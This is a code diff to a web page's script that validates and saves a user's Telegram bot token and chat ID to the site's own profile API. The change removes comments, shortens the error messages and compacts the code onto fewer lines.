                     document.getElementById('tgChatId').value = data.telegramChatId || "";
                 }
-            } catch(e) { 
-                console.error("Profil yüklenemedi", e); 
-            }
+            } catch(e) { }
         }
         
-        // Sayfa açıldığında ayarları da çek
         loadProfilAyarlari();
 
-        // --- TELEGRAM AYARLARINI KAYDET VE DOĞRULA ---
         document.getElementById('tgKaydetBtn').addEventListener('click', async function() {
             const botToken = document.getElementById('tgBotToken').value.trim();
             const chatId = document.getElementById('tgChatId').value.trim();
             
-            // 🔥 FRONTEND REGEX TOKADI 🔥
             if (botToken !== "") {
                 const tokenRegex = /^\d{8,12}:[\w-]{35}$/;
-                if (!tokenRegex.test(botToken)) {
-                    showToast("Geçersiz Token! Format hatalı (Örn: 123456789:ABC...)", "error");
-                    return; // İsteği durdur
-                }
+                if (!tokenRegex.test(botToken)) { showToast("Geçersiz Token formatı!", "error"); return; }
             }
-            
             if (chatId !== "") {
                 const chatRegex = /^-?\d{7,15}$/;
-                if (!chatRegex.test(chatId)) {
-                    showToast("Geçersiz Chat ID! Sadece rakam giriniz.", "error");
-                    return; // İsteği durdur
-                }
+                if (!chatRegex.test(chatId)) { showToast("Geçersiz Chat ID!", "error"); return; }
             }
 
-            const btn = this;
-            btn.disabled = true;
-            btn.innerText = "Kaydediliyor...";
-
+            const btn = this; btn.disabled = true; btn.innerText = "Kaydediliyor...";
             try {
                 const res = await fetch(`${API_BASE}/profilim/guncelle`, {
-                    method: 'PATCH',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer ' + token 
-                    },
-                    body: JSON.stringify({ 
-                        telegramBotToken: botToken, 
-                        telegramChatId: chatId 
-                    })
+                    method: 'PATCH', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+                    body: JSON.stringify({ telegramBotToken: botToken, telegramChatId: chatId })
                 });
-                
-                // Backend'den gelen 400 (Bad Request) hatasını yakala
-                if (res.status === 400) {
-                    const errorData = await res.json();
-                    showToast(errorData.hata, "error");
-                    return;
-                }
-
+                if (res.status === 400) { const errorData = await res.json(); showToast(errorData.hata, "error"); return; }
                 if (checkTokenError(res)) return;
-                
                 showToast("Telegram bildirim ayarları başarıyla kaydedildi!", "success");
-            } catch(e) {
-                showToast("Ayarlar kaydedilirken bir sorun oluştu.", "error");
-            } finally {
-                btn.disabled = false;
-                btn.innerText = "Değişiklikleri Kaydet";
-            }
+            } catch(e) { showToast("Ayarlar kaydedilemedi.", "error"); } 
+            finally { btn.disabled = false; btn.innerText = "Değişiklikleri Kaydet"; }
         });
     </script>
 </body>
